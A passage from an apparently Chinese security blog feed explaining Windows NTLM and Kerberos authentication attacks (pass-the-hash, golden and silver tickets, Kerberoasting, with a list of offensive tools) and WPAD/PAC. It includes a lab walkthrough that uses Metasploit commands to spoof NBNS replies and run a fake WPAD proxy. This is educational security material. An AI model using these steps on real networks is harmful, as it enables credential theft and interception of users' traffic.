negotiate。由于 Kerberos 的安全性要比 NTLM 更高，在 negotiate 情况下 Windows 会判断 Kerberos 是否可用，如果可用就优先使用 Kerberos，否则才会使用 NTLM。</p></blockquote><h3 id="SSPI-amp-SSP"><a href="#SSPI-amp-SSP" class="headerlink" title="SSPI &amp; SSP"></a>SSPI &amp; SSP</h3><p><strong>SSPI（Security Support Provider Interface ）</strong>是 Windows 定义的一套接口，此接口定义了与安全有关的功能函数；<strong>SSP（Security Support Provider）</strong>是 SSPI 的实现者，用于提供安全功能，比如 <strong>NTLMSSP（NTLM Security Support Provider）</strong>就为 NTLM 认证的实现提供了基本功能，类似的还有 Negotiate、Kerberos、CredSSP、DigestSSP、NegotiateSSP 等。</p><blockquote><p>注：由于 NTLMSSP 只是实现了 NTLM 认证，它并没有规定使用什么协议来进行传输。实际上 SMB、HTTP、LDAP、MSSQL 等协议都可以携带 NTLM 认证的三类消息，也就是说我们可以通过这些协议来进行攻击。</p></blockquote><h3 id="NTLM-Relay-amp-PTH"><a href="#NTLM-Relay-amp-PTH" class="headerlink" title="NTLM-Relay &amp; PTH"></a>NTLM-Relay &amp; PTH</h3><p>NTLM-Relay 和 <strong>Pass the Hash（PTH）</strong>在某些部分有些相似，但实际上是完全不同的两个东西。NTLM-Relay 针对的是用于网络认证的 Net-NTLM Hash，而 LMHash 或者 NTHash 从严格意义上讲，可以用来进行 pass the hash attack，但并不能进行 relay attack。</p><blockquote><p>通常我们使用 Responder 等工具获取到的就是 Net-NTLM Hash，这类 hash 并不能直接用来 PTH，但可以通过暴力破解来获取明文密码。</p></blockquote><p>Pass the Hash 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过传递 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。如果内网主机的本地管理员账户密码相同，即可通过 Pass the Hash 远程登录到任意一台主机。</p><p>利用 Pass the Hash 的渗透方式如下：</p><ol><li>获取某一台域主机管理员权限；</li><li>Dump（抓取）内存获取用户 hash；</li><li>通过 Pass the Hash 尝试登录其他主机；</li><li>继续搜集 hash 并尝试远程登录；</li><li>直到获得域管理员账户 hash，登录域控，最终成功控制整个域。</li></ol><p>这类攻击适用于：</p><ul><li>域/工作组环境</li><li>可以获得 hash，但条件不允许对 hash 进行爆破</li><li>内网中存在和当前机器相同的密码</li></ul><h3 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h3><p>随着大家对 Pass the Hash 的认识越来越高，防御方法也越来越多，微软在2014年发布了更新补丁 kb2871997 禁止本地管理员账户用于远程连接，这样就无法以本地管理员用户的权限执行 WMI、psexec、schtasks、at 和访问文件共享。同样，禁用 NTLM 也使得 psexec 无法利用获得的 NTLM Hash 进行远程连接。</p><blockquote><p>然而，安全研究人员在测试中发现，打了补丁之后，常规的 Pass The Hash 已经无法成功，唯独默认的 Administrator（SID 500）账号例外，利用这个账号仍可以进行 Pass The Hash 远程连接（2014）。</p><p>所以对于防御方来说，即使打了补丁也要记得禁用 SID=500 的管理员账户。</p></blockquote><p>由于 <strong>mimikatz</strong> 的出现， 再次改变了格局。国外安全研究人员开发的 mimikatz 实现了在禁用 NTLM 的环境下仍然可以远程连接，并且可以通过用户账户的 aes Key 进行远程连接，即利用 <strong>Pass the Key（PTK）</strong>。</p><h2 id="0x04-Kerberos-身份认证"><a href="#0x04-Kerberos-身份认证" class="headerlink" title="0x04 Kerberos 身份认证"></a>0x04 Kerberos 身份认证</h2><p>Kerberos 一词来源于希腊神话，是一种基于 <strong>票据（Ticket）</strong>的认证方式，其中三个主体分别是客户端、服务器和第三方认证服务器 KDC。客户端用户在访问服务器前，需要先从第三方认证服务器 KDC 处获取许可证，只有通过合法性认证的用户，才能依据票据去访问所需的服务和应用。</p><blockquote><p>在 Windows 域环境中，KDC 的角色由 DC（Domain Controller）来担当。</p></blockquote><h3 id="Kerberos-认证过程"><a href="#Kerberos-认证过程" class="headerlink" title="Kerberos 认证过程"></a>Kerberos 认证过程</h3><p>一次完整的 Kerberos 身份认证流程，如图所示：</p><p><img src="/img/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/kerberos.png"></p><p>1）账号 A 和 KDC 互相认证</p><p>账号 A 利用 hash 函数把密码转化成一把密钥，我们称它为 Kclt，用 Kclt 加密当前时间戳，生成一个字符串 {时间戳}Kclt。把上一步生成的字符串 {时间戳}Kclt、账号 A 的信息，以及一段随机字符串发给 KDC。这样就组成了 Kerberos 的身份认证请求 <strong>AS_REQ</strong>。</p><p>KDC 收到 AS_REQ 之后，先读到账号 A 的信息，于是便调出 A 的密码，再用同样的 hash 函数转化为 <strong>Kclt</strong>。有了 Kclt 就可以解开{时间戳}Kclt，如果能成功解开，则说明该请求是由账号 A 生成的，即完成对账号 A 的身份认证。</p><p>接下来轮到 KDC 向账号 A 证明自己的身份，KDC 使用 Kclt 加密随机字符串，回复给账号 A，如果账户 A 拿到回复后能够解出随机字符串，则说明 KDC 为真。</p><p>同时，KDC 生成两把一样的密钥 <strong>Kclt-Kdc</strong>，用于以后账户 A 和 KDC 之间互相认证，这样就省去了每次都要调出账号 A 的密码和 hash 等工作。其中一把密钥发给账户 A 保管，另一把由 KDC 把自己的密码 hash 成 <strong>KKdc</strong>，然后用它加密另一把委托给 A 的密钥，把这个委托的密钥称为 <strong>TGT（Ticket Granting Ticket）</strong>，TGT = {账户 A 的信息, Kclt-kdc}，返回 <strong>AS_REP</strong> = TGT, {Kclt-kdc, 时间戳, 随机字符串}Kclt。</p><p>账号 A 收到 AS_REP 后利用 Kclt 解密信息，通过解开随机字符串和时间戳来确定 KDC 的真实性，然后把 Kclt-kdc 和 TGT 保存起来备用。</p><p>2）账号 A 请求 KDC 认证资源 B</p><p>首先 A 将 TGT 交还给 KDC，其次还有账号 A 的相关信息，当前时间戳，以及要访问的资源 B 的信息，生成 <strong>TGS-REQ</strong>。</p><p>KDC 收到 TGS-REQ 后，先用 Kkdc 解密 TGT 得到 Kclt-kdc，再用 Kclt-kdc 解密出账号 A 的相关信息和时间戳来验证其身份。一旦确认账号A为真，就可以帮助 A 和 B 完成互相认证了。</p><p>KDC 生成两把同样的密钥 <strong>Kclt-srv</strong> 供 A 和 B 之间使用，其中一把密钥直接交给 A，另一把委托 A 交给 B。为了确保 A 不会受到假的资源 B 欺骗，Kerberos 把 B 的密码 hash 成 <strong>Ksrv</strong>，然后用它加密那把委托 A 交给 B 的 Kclt-srv ，成为一张只有真正的 B 能解开的 <strong>Ticket</strong>，Ticket = {账户 A 的信息, Kclt-srv}Ksrv，返回 <strong>TGS-REP</strong> = {Kclt-srv}Kclt-kdc, Ticket。</p><p>账号 A 收到 TGS-REP 后，先用 Kclt-kdc 解开 {Kclt-srv}Kclt-kdc，得到 Kclt-srv，再将 Ticket 保留着发给资源B。接下来如果需要多次访问资源 B，<strong>都可以使用同一个 Ticket，而不需要每次都向 KDC 申请</strong>。</p><p>3）账号 A 和资源 B 互相认证</p><p>账号 A 给资源 B 发送 <strong>CS-REQ</strong> = {账号A的信息，时间戳}Kclt-srv, Ticket。如果资源 B 为真，则可以使用自己的 Ksrv 解开 Ticket，得到 Kclt-srv，从而可以解开 {账号A的信息，时间戳}Kclt-srv，这样资源 B 就可以确定账户 A 为真，然后回复 <strong>CS-REP</strong> = {时间戳}Kclt-srv，来证明自己也是真的。账号 A 解密 CS-REP，再通过时间戳来判断对方是否为真。</p><p>更详细的过程可参考《Wireshark网络分析就这么简单》中 Kerberos 的相关章节，作者的解释十分通俗易懂。</p><h3 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h3><p><strong>Pass the Ticket（PTT）</strong>是利用 Kerberos 协议进行的 Ticket 传递攻击，有三种常见的利用方法：MS14-068，Golden Ticket 和 Silver Ticket。</p><h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h4><p>MS14-068 是 Windows 密钥分发中心（KDC）服务中的一个严重漏洞，其影响全部版本 Windows 版本的服务器，该漏洞允许攻击者提升任意普通域用户成为域管理员账户，攻击者可以利用这些提升的权限控制域中所有的计算机，包括域服务器。</p><p>漏洞的主要成因是由于 KDC 允许经过身份验证的用户在其 Kerberos 票证（TGT）中插入任意 PAC，当用户进行登录身份验证时，KDC 会验证 PAC 中的签名，并使用 PAC 中的数据为用户创建一个登录令牌，而 KDC 服务器端的 PAC signature 时没有严格控制使用 checksum 算法，导致客户端可以提交伪造的 PAC 欺骗 KDC 获取任意票证。</p><p>关于 MS14-068 漏洞的详细分析可以看这篇文章：<a href="https://www.freebuf.com/vuls/56081.html">深入解读 MS14-068 漏洞：微软精心策划的后门？</a></p><h4 id="黄金票据（Golden-Ticket）"><a href="#黄金票据（Golden-Ticket）" class="headerlink" title="黄金票据（Golden Ticket）"></a>黄金票据（Golden Ticket）</h4><p>该票据的利用条件是原先已成功取得 KDC（<strong>krbtgt</strong> 用户）的密码 hash（即 KKdc），并且还有一个普通域用户权限，在此条件下，我们可以利用 krbtgt 的 hash 值伪造生成任意用户的 TGT，绕过账号策略，让用户成为任意组的成员，还能利用该票据重新获得域管理员权限。</p><blockquote><p>因为 krbtgt 只有域控制器上才有，使用黄金凭据意味着你之前拿到过域控制器的权限，所以可以理解为是一个后门。</p></blockquote><h4 id="白银票据（Silver-Ticket）"><a href="#白银票据（Silver-Ticket）" class="headerlink" title="白银票据（Silver Ticket）"></a>白银票据（Silver Ticket）</h4><p>通过分析 Kerberos 协议的认证过程不难发现，如果我们获取了 Server B 的秘钥 Ksrv，就可以跳过 KDC 的认证，直接伪造票据与 Server 通信。</p><p>Silver Ticket 和 Golden Ticket 不同的是，它不需要和域控制器进行通信，原理是伪造 TGS 服务器，使用计算机账户的 hash 进行加密，所以只能对单一的服务进行授权，访问指定的权限。而 Golden Ticket 的利用过程需要访问域控，原理是伪造 TGT，由 Kerberos 的 hash 进行加密，可以获取任何 Kerberos 服务权限。</p><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>2014年 SANS HackFest 大会上 Tim Medin 提出了一种新的攻击 Kerberos 的技术，他称之为 “Kerberoasting”。Tim 给出的利用方法是使用工具集的组合来请求票证，并从内存中提取票证，然后将它们转换为可破解的格式。更详细的技术细节，可以见 Tim 的 PPT 或 <a href="https://adsecurity.org/?p=2293">Cracking Kerberos TGS Tickets Using Kerberoast</a>。</p><h2 id="0x05-相关利用工具"><a href="#0x05-相关利用工具" class="headerlink" title="0x05 相关利用工具"></a>0x05 相关利用工具</h2><ul><li><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>：PTH、PTK、PTT 攻击，提取 Windows 明文密码、hash 值等凭据。</li><li><a href="https://github.com/PowerShellMafia/PowerSploit">PowerView</a>：PowerSploit 框架和 Empire 的一部分，用于内网信息搜集。</li><li><a href="https://github.com/Kevin-Robertson/Invoke-TheHash">wmiexec</a>：Windows WMIC 的强化版，可用于 PTH 攻击。</li><li><a href="https://github.com/nidem/kerberoast">Kerberoast</a>：Kerberoasting 利用工具包。</li><li><a href="https://github.com/SpiderLabs/Responder">Responder</a>：劫持 LLMNR 和 NBT-NS 请求，获取 Net-NTLM Hash。</li></ul><p><strong>参考文章：</strong><br><a href="https://2018.zeronights.ru/wp-content/uploads/materials/08-Ntlm-Relay-Reloaded-Attack-methods-you-do-not-know.pdf">腾讯安全玄武实验室 NTLM Relay Reloaded Attack methods you do not know.pdf</a><br><a href="https://xz.aliyun.com/t/2445">https://xz.aliyun.com/t/2445</a><br><a href="http://www.tiejiang.org/23508.html">http://www.tiejiang.org/23508.html</a><br><a href="http://xnianq.cn/2018/10/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">http://xnianq.cn/2018/10/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</a><br><a href="https://www.cnblogs.com/bmjoker/p/10355979.html#autoid-0-0-0">https://www.cnblogs.com/bmjoker/p/10355979.html#autoid-0-0-0</a><br><a href="https://www.4hou.com/technology/16263.html">https://www.4hou.com/technology/16263.html</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/">https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>身份认证</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
      <tag>Windows</tag>
      
      <tag>域控</tag>
      
      <tag>NTLM</tag>
      
      <tag>Kerberos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WPAD 协议分析及内网渗透利用</title>
    <link href="/post/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/"/>
    <url>/post/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>本文将会阐述 WPAD 协议的工作原理、实现方式以及在内网渗透中的应用思路。</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>WPAD 这项技术已经诞生了近十年的时间，其最大的优势就在于在一个或多个局域网中，当需要为内网中的用户设置不同的代理服务器去连接互联网或者企业内网时，利用  WPAD 就能够灵活方便的进行配置。由于配置代理服务器的方式对于用户来说是透明的，因此，攻击者就容易利用 WPAD 进行内网的渗透。</p><p>可能是由于常规的内网渗透，如 Windows 域的渗透中，攻击者只需拿到域控的权限即可控制域中的任何机器，所以攻击者往往只关注如何抓到域管理员的 Hash，而即使在工作组的渗透中，也有着比 WPAD 更有效的攻击方式。因此，虽然利用 WPAD 进行内网渗透的技术已经出现了很多年了，但一直没有变得像 ARP Spoof 等攻击方式那么流行。但是在攻击者“无计可施”的时候，也会采用一些“非主流”的方式进行内网渗透，WPAD 可能造成的安全隐患，不容我们忽视。</p><h2 id="0x01-WPAD-简介"><a href="#0x01-WPAD-简介" class="headerlink" title="0x01 WPAD 简介"></a>0x01 WPAD 简介</h2><p><strong>WPAD（Web Proxy Auto-Discovery Protocol，网络代理自动发现协议）</strong>，可以使局域网中用户的浏览器自动发现内网中的代理服务器，并使用已发现的代理服务器连接互联网或者企业内网。WPAD 支持所有主流的浏览器，从 IE 5.0 开始就已经支持了代理服务器自动发现/切换的功能，而苹果公司考虑到 WPAD 的安全风险，在包括 OSX 10.10 及之后版本的操作系统中的 Safari 浏览器将不再支持 PAC 文件的解析。</p><blockquote><p>注：默认情况下，在所有 Windows 操作系统和 IE 浏览器上都启用了 WPAD，而 Mac OS X 和 Linux 操作系统，以及 Safari、Chrome 和 Firefox 等浏览器，虽然支持 WPAD，但默认情况下不会启用。</p></blockquote><h3 id="WPAD-工作原理"><a href="#WPAD-工作原理" class="headerlink" title="WPAD 工作原理"></a>WPAD 工作原理</h3><p>当系统开启了代理自动发现功能后，用户使用浏览器上网时，浏览器就会在当前局域网中自动查找可以加载 PAC 文件的服务器，之后下载 PAC 配置文件（通过 80 端口），并执行特定的 JavaScript 脚本将相应的代理服务器设置到用户的浏览器中。</p><p><strong>WPAD 查询步骤如下：</strong></p><ul><li>如果 DHCP 服务器配置了 wpad，那么直接从 DHCP 服务器获取 wpad.dat 文件，如果成功则下载 wpad.dat 文件并配置，否则执行下一步；</li><li>向 DNS 服务器发送请求查找 wpad.test.local，然后获取代理配置文件，如果成功下载 wpad.dat 文件并配置，否则执行下一步；</li><li>发送 LLMNR 查询 wpad.test.local，如果成功则下载 wpad.dat 文件并配置，否则代理设置失败。</li></ul><h3 id="PAC-文件"><a href="#PAC-文件" class="headerlink" title="PAC 文件"></a>PAC 文件</h3><p><strong>PAC（Proxy Auto-Config，代理自动配置文件）</strong>，定义了浏览器和其他用户代理在访问一个 URL 时所应该使用的代理服务器（完成自动选择），使用 <strong>Javascript</strong> 进行 URL 和代理服务器的描述。通常使用 <strong>proxy.pac</strong> 作为文件名，WPAD 标准则要求使用 <strong>wpad.dat</strong> 作为 PAC 文件的文件名。</p><blockquote><p>要使用 PAC，则应当在网页服务器上发布一个 PAC 文件，并且通过浏览器的代理链接设置页面输入这个 PAC 文件的 URL 或者使用 WPAD 协议告知用户代理去使用这个文件。</p></blockquote><p>一个 PAC 文件至少定义了一个名为 <strong>FindProxyForURL(url, host)</strong> 的 JavaScript 函数，该函数的返回值是一个字符串，指定了 URL 的访问方式，两个参数分别代表了要指定设置的 URL 和 该 URL 所对应的主机名。</p><p>PAC 文件内容示例如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">FindProxyForURL</span>(<span class="hljs-params">url, host</span>) </span>&#123;<br>   <span class="hljs-keyword">if</span> (url== <span class="hljs-string">&#x27;http://example.org/&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;DIRECT&#x27;</span>;<br>   <span class="hljs-keyword">if</span> (shExpMatch(host, <span class="hljs-string">&quot;*.wooyun.org&quot;</span>)) <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;DIRECT&quot;</span>;<br>   <span class="hljs-keyword">if</span> (host== <span class="hljs-string">&#x27;wooyun.com&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;SOCKS 127.1.1.1:8080&#x27;</span>;<br>   <span class="hljs-keyword">if</span> (dnsResolve(host) == <span class="hljs-string">&#x27;10.0.0.100&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;PROXY 127.2.2.2:8080;DIRECT&#x27;</span>;<br>   <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;DIRECT&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该文件定义了当用户访问 <a href="http://example.org/">http://example.org</a> 时，将不使用任何代理服务器直接（DIRECT）访问 URL。也可以使用 <strong>shExpMatch</strong> 函数对 host 或者 url 进行匹配设置，<strong>SOCKS 127.1.1.1:8080</strong> 指定了使用 127.1.1.1:8080 的 SOCKS 代理进行 URL 的访问，<strong>PROXY 127.2.2.2:8080;DIRECT</strong> 指定了使用 127.2.2.2:8080 的 HTTP 代理进行 URL 的访问，如果连接 127.2.2.2:8080 的 HTTP 代理服务器失败，则直接（DIRECT）访问 URL。</p><blockquote><p>注：FF 和 IE 只支持系统默认的编码类型的 PAC 文件，并且不支持 Unicode 编码，如 UTF-8。</p></blockquote><h2 id="0x02-Windows-中的-WPAD"><a href="#0x02-Windows-中的-WPAD" class="headerlink" title="0x02 Windows 中的 WPAD"></a>0x02 Windows 中的 WPAD</h2><h3 id="IE-浏览器中默认开启-WPAD"><a href="#IE-浏览器中默认开启-WPAD" class="headerlink" title="IE 浏览器中默认开启 WPAD"></a>IE 浏览器中默认开启 WPAD</h3><p>在 Windows 系统中，从 IE 5.0 开始就支持了 WPAD，并且是默认开启 WPAD 功能的，如下图所示：</p><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/20171207135000-76d44886-db12-1.png" alt="Windows 中 IE 浏览器的 WPAD 设置"></p><p>另外，Windows 系统从 IE 5.5 开始支持“自动代理结果缓存”功能，并默认设置为开启。因为每次客户端浏览器成功连接 HTTP 代理服务器时都会更新 ARP 缓存，开启此功能后，当客户端浏览器再次连接代理服务器，即再次调用 FindProxyForURL() 函数时，会先检查 ARP 缓存列表中是否存在要连接的 HTTP 代理服务器地址，再选择是否需要代理，以缩减系统获取分配对象的开销。</p><h3 id="WinHTTP-的-WPAD-支持"><a href="#WinHTTP-的-WPAD-支持" class="headerlink" title="WinHTTP 的 WPAD 支持"></a>WinHTTP 的 WPAD 支持</h3><p>在 Windows 系统中，有一个服务名为 <strong>WinHTTP Web Proxy Auto-Discovery Service</strong>，其描述信息为  “WinHTTP 实现了客户端 HTTP 堆栈并向开发人员提供 Win32 API 和 COM 自动化组件以供发送 HTTP 请求和接收响应。此外，通过执行 Web 代理自动发现（WPAD）协议，WinHTTP 还提供对自动发现代理服务器配置的支持。”，如图所示：</p><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/1562741625870.png" alt="Windows 中的 WinHttpAutoProxySvc 服务"></p><p><strong>出于安全性考虑，建议禁用。</strong></p><blockquote><p>注：WPAD 并不是 IE 浏览器的功能，而是属于WinHTTP 库中的功能，有一个单独的 WinHttpAutoProxySvc 服务。WinHTTP 是Windows系统下提供 autoproxy 服务的独立的网络库，专门为提供 HTTP/HTTPS 服务的。<br>网上很多文章说，防止 WPAD 攻击就是禁用浏览器的 WPAD，这个方法只能说治标不治本。单单禁用浏览器的 WPAD 功能只能保证浏览器的访问数据没法通过 WPAD 劫持了，但是这种禁用方式不会影响 WinHTTP 的功能。在 WIN 系统下，处理 HTTP 的请求基本都用 WinHTTP 的库，如果其他程序使用 WinHTTP，WPAD 照样还是可以攻击。</p></blockquote><h2 id="0x03-WPAD-实现方式"><a href="#0x03-WPAD-实现方式" class="headerlink" title="0x03 WPAD 实现方式"></a>0x03 WPAD 实现方式</h2><p>WPAD 通过让浏览器自动发现代理服务器，使代理服务器对用户来说是透明的，进而轻松访问互联网。WPAD 可以借助 DHCP 服务器、DNS 服务器和 WINS 服务器，来查询代理自动配置（PAC）文件的位置，如图所示：</p><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/1562809252340.png" alt="WPAD 查询 PAC 文件的方式"></p><h3 id="使用-DHCP-配置-WPAD"><a href="#使用-DHCP-配置-WPAD" class="headerlink" title="使用 DHCP 配置 WPAD"></a>使用 DHCP 配置 WPAD</h3><p><strong>DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）</strong>，是一个用于局域网的网络管理协议，可以为进入网络的任何新节点进行动态分配，主要功能是分配 IP 地址，此外还包含一些其他信息，如子网掩码、 WPAD 等，这些额外的信息都是通过 DHCP 协议中的 <strong>Options</strong> 字段传输的。</p><p>DHCP 的工作流程有 4 个步骤：</p><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/20171207135039-8e14982a-db12-1.png" alt="DHCP 工作流程"></p><p>上图即为客户端与 DHCP 服务器进行交互的过程。其中前两个流程主要是客户端发送广播包，DHCP  服务器进行响应并客户端进行单播通讯，后面的两个流程即为客户端从 DHCP 服务器获取 IP 地址的过程。</p><p>当使用 DHCP 服务器配置 WPAD 时，DHCP 协议将会有所改变，增加了 <strong>DHCPINFORM</strong> 消息（具体的改变可以在 <a href="https://tools.ietf.org/html/rfc2131">RFC 2131</a> 中看到），用于客户端请求本地配置参数。所以客户端在请求 WPAD 主机时就会发送 DHCPINFORM 请求消息，查询 PAC 文件位置；之后 DHCP 服务器会应答 DHCPINFORM 请求，返回 DHCPACK 确认消息，此消息中的 DHCP Options 字段里包含的 DHCP <strong>252</strong> 选项即为 WPAD 代理服务器的 PAC 文件地址。</p><blockquote><p>注：在目前的大多数内网中已经不再使用 DHCP 服务器进行客户端 WPAD 的配置了，而是采用较为简单的 DNS 服务器进行配置，关于 DHCP Options  的其他定义可以查看 DHCP 的 <a href="https://tools.ietf.org/html/rfc1531">RFC 1531</a>。</p></blockquote><h3 id="利用-DNS-配置-WPAD"><a href="#利用-DNS-配置-WPAD" class="headerlink" title="利用 DNS 配置 WPAD"></a>利用 DNS 配置 WPAD</h3><p>利用 DNS 配置 WPAD 的方式本质上还是利用了 Windows 系统的名称解析机制，其过程如下：</p><ul><li><p>如果客户端主机是处于域环境下时，客户端主机向 DNS 服务器发起的 WPAD+X 的查询请求为 <strong>“WPAD.当前域的域名”</strong>，DNS 服务器对 WPAD 主机的名称进行解析返回 WPAD 主机的 IP 地址，客户端 Web 浏览器通过 WPAD 主机的 IP 的 80 端口下载并解析 PAC 文件；</p></li><li><p>如果客户端主机是在工作组环境中，客户端主机向 DNS 服务器发起的 WPAD+X 的查询时，则会遵循 Windows 系统的名称解析顺序，查询请求的名称均为 <strong>“WPAD”</strong>，OS 版本为 Vista 之后的（包括 Vista）顺序为：DNS =&gt; LLMNR =&gt; NBNS，反之则为 DNS =&gt; NBNS。</p></li></ul><h3 id="通过-NBNS-配置-WPAD"><a href="#通过-NBNS-配置-WPAD" class="headerlink" title="通过 NBNS 配置 WPAD"></a>通过 NBNS 配置 WPAD</h3><p>如果 <strong>DHCP 服务器和 DNS 服务器均没有响应</strong>，同时当前缓存没有所请求的主机名，就会发起如下名称解析：</p><ul><li><p>如果当前系统支持 LLMNR，先发起 LLMNR 广播查询；</p></li><li><p>如果没有响应，再发起 NBNS 广播查询；</p></li><li><p>如果有主机回应 PAC 文件位置，Web 浏览器通过该 IP 的 80 端口下载 wpad.dat文件。</p></li></ul><blockquote><p>注：Windows 2K，XP，2K3 只支持 DNS 和 NetBIOS<br>Windows Vista 之后（包括 2K8，Win7，Win8.x，Win 10）支持DNS、NetBIOS、LLMNR</p></blockquote><h2 id="0x04-使用-MSF-进行-WPAD-内网渗透"><a href="#0x04-使用-MSF-进行-WPAD-内网渗透" class="headerlink" title="0x04 使用 MSF 进行 WPAD 内网渗透"></a>0x04 使用 MSF 进行 WPAD 内网渗透</h2><p>对照 WPAD 的原理，不难发现其中存在漏洞，可以利用 Windows 系统名称解析机制的缺陷，进行 WPAD 的“恶意”配置，从而进行内网的渗透。一种常见的利用方式是在被攻击用户发起 NBNS 查询时伪造 NBNS 响应，那么就可以控制其通过伪造的代理服务器上网，达到会话劫持的目的，如下图所示：</p><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/2019-08-06_161644.png" alt="利用 WPAD 进行内网渗透"></p><p><strong>使用 MSF 对以上过程进行测试，进行 WPAD 内网渗透：</strong></p><ul><li><p><strong>测试环境：</strong></p><ul><li><p>被攻击用户：</p><p>Windows 7、192.168.16.191</p></li><li><p>攻击用户：</p><p>Kali Linux、192.168.16.245</p></li></ul></li></ul><p><strong>1. 监听 NBNS 查询请求</strong></p><blockquote><p>use auxiliary/spoof/nbns/nbns_response<br>set regex WPAD<br>set spoofip 192.168.16.245<br>run</p></blockquote><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/2019-08-06_155506.png" alt="监听 NBNS 查询请求"></p><p><strong>2. 伪造 WPAD 服务器</strong></p><blockquote><p>use auxiliary/server/wpad<br>set proxy 192.168.16.245<br>run</p></blockquote><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/2019-08-06_155507.png" alt="伪造 WPAD 服务器"></p><p><strong>3. 伪造被攻击用户发起查询</strong></p><p>构造广播 NBNS 查询，前提是需要使当前 DHCP 和 DNS 服务器均无法提供的 PAC 文件位置。</p><blockquote><p>注：关闭上述服务器后浏览器访问任意网页即可。</p></blockquote><p><strong>4. 响应被攻击用户的广播 NBNS 查询</strong></p><p>攻击主机响应广播 NBNS 查询并指定 PAC 文件位置，被攻击主机访问指定的 PAC 位置请求下载。</p><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/2019-08-06_155508.png" alt="攻击者发起恶意响应"></p><p><strong>5. 使用 Burp 配置代理服务器</strong></p><p>配置 Burp 代理 IP 为 192.168.253.131:8080，使受害者通过攻击者的代理服务器访问互联网。</p><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/2019-08-06_155552.png" alt="配置 Burp 代理服务器"></p><p><strong>6. 被攻击用户使用伪造的代理配置上网</strong></p><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/2019-08-06_155627.png" alt="受害者通过代理访问网页"></p><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/2019-08-06_155646.png" alt="查看受害者主机 NetBIOS缓存"></p><h2 id="0x05-WPAD-内网渗透深入研究"><a href="#0x05-WPAD-内网渗透深入研究" class="headerlink" 